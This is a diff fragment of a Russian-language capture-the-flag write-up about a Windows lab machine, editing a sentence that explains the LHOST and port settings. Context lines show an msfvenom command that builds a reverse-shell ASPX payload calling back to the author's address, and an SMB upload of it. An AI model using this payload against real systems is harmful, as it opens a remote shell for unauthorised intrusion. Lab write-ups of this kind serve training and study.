@@ -29,7 +29,7 @@ Relevant - это машина на Windows, которая имитирует �
 
 ![Решения](images/202.png)
 
-Далее я создал и загрузил шелл:
+Далее я создал и загрузил шелл, где в `LHOST` я указал свой айпи, а в `LROPT` порт 1234:
 
 `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.112.118.150 LPORT=1234 -f aspx > payload.aspx`  
 `put payload.aspx`  
